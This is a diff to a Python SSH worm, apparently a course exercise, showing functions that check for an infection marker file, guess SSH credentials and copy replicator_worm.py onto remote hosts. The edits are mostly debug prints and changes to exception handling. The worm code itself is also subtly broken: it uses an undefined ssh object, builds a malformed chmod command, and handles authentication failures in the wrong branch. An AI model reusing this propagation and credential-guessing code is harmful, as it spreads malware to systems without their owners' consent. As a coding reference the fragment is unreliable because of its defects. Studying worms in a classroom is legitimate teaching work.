@@ -32,6 +32,7 @@ def isInfectedSystem():
 	try:
 		print("checking for infected.txt")
 		f=open("/tmp/infected.txt", "r")
+		print("f is opened")
 		f.close()
 		return True
 	except IOError:
@@ -69,7 +70,7 @@ def spreadAndExecute(sshClient):
 	# code we used for an in-class exercise.
 	# The code which goes into this function
 	# is very similar to that code.	
-	print("inside the spreadAndExecut")
+	print("inside the spreadAndExecute")
 	sshClient.put("replicator_worm.py","/tmp/"+"replicator_worm.py")
 	ssh.exec_command("chmod a+x python /tmp/replicator_worm.py")
 
@@ -111,10 +112,11 @@ def tryCredentials(host, userName, password, sshClient):
 		print(host,userName, password)
 		return 0
 	#return 1 if wrong credentials
-	except paramiko.AuthenticationException:
-		return 1
 	except paramiko.SSHException:
-		#print "Connection Failed"
+		print("Wrong credentials!")
+		return 1
+	except socket.error:
+		print("This SSH server has issues or is not running..")
 		return 3
 	
 
